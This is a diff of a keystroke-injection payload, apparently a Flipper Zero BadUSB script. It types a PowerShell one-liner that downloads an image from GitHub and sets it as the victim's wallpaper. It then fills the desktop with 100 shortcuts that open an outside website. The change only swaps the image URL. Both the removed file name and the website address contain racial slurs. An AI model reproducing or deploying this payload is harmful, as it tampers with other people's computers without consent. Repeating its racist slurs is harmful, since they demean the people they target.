@@ -9,5 +9,5 @@ ENTER
 DELAY 1000
 ALT y
 DELAY 2000
-STRING iwr 'https://raw.githubusercontent.com/JelleF09/FZ-Files/refs/heads/main/piccas/Kankerdikke-Negervis.png' -OutFile $env:TEMP\picca.png; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Wall{[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int a,int b,string c,int d);}';[Wall]::SystemParametersInfo(20,0,\"$env:TEMP\picca.png\",3);1..100|%{$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$env:USERPROFILE\Desktop\LOL_$_.lnk\");$s.TargetPath='cmd.exe';$s.Arguments='/c start https://www.niggafart.com/';$s.IconLocation='$env:TEMP\picca.png,0';$s.Save()};rm $env:TEMP\picca.png
+STRING iwr 'https://raw.githubusercontent.com/JelleF09/FZ-Files/refs/heads/main/SRC/image.png' -OutFile $env:TEMP\picca.png; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Wall{[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int a,int b,string c,int d);}';[Wall]::SystemParametersInfo(20,0,\"$env:TEMP\picca.png\",3);1..100|%{$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$env:USERPROFILE\Desktop\LOL_$_.lnk\");$s.TargetPath='cmd.exe';$s.Arguments='/c start https://www.niggafart.com/';$s.IconLocation='$env:TEMP\picca.png,0';$s.Save()};rm $env:TEMP\picca.png
 ENTER
